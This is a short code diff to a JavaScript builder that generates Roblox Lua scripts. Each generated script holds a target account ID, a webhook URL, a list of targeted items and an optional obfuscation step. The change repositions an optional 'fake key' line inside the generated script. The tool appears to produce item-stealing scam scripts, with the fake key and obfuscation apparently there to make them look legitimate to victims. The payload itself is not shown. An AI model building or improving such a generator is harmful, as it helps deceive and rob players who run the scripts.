@@ -2391,6 +2391,10 @@ task.spawn(function()
 end)`;
   }
 
+  const useFakeKey = document.getElementById("toggleFakeKey").checked;
+  const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
+  const fakeKeyLine = (useFakeKey && fakeKeyVal) ? `script_key = "${fakeKeyVal}"\n\n` : "";
+
   let script = `getgenv().targetId = ${targetId}
 getgenv().webhookUrl = "${webhookUrl}"
 
@@ -2403,13 +2407,7 @@ ${bs}}
 getgenv().targetGears = {
 ${gr}}
 
-${execBlock}`;
-
-  const useFakeKey = document.getElementById("toggleFakeKey").checked;
-  const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
-  if (useFakeKey && fakeKeyVal) {
-    script = `script_key = "${fakeKeyVal}"\n` + script;
-  }
+${fakeKeyLine}${execBlock}`;
 
   if (useObfuscate) {
     try {
